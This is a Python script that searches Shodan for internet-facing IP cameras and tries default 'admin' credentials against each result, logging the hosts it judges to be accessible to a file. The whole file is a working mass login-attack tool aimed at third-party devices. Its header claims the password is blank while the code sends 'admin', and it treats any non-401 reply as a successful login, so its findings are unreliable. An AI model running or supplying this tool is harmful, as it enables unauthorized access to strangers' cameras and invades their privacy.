#!/usr/bin/env python
#
# boa.py
# Search SHODAN for boa http with default user admin and pass blank.
#
# Author: random_robbie

import shodan
import json
import requests
import sys
from requests.auth import HTTPBasicAuth
# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = 'Wireless Day/Night IP Camera'

session = requests.Session()

def check_login (IP,PORT):
	try:
		print ("[*] Testing: "+IP+" on Port: "+PORT+" [*]")
		if PORT == "443":
			url = "https://"+IP+":"+PORT+"/"
		else:
			url = "http://"+IP+":"+PORT+"/"
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
		response = session.get(url, headers=headers, verify=False ,timeout=15,auth=HTTPBasicAuth("admin","admin"))
		if response.status_code == 401:
			print ("[*] Default Creds Changed [*]")
		else:
			print ("\n[*] Logged in with default creds [*]\n")
			text_file = open("vun.txt", "a")
			text_file.write(""+IP+":"+PORT+"\n")
			text_file.close()
			
	except requests.exceptions.Timeout:
		print ("[*] "+IP+" Timeout unable to connect [*]")
	except Exception as e:
		print('Error: %s' % e)



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = str(service['ip_str'])
				PORT = str(service['port'])
				check_login (IP,PORT)

				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)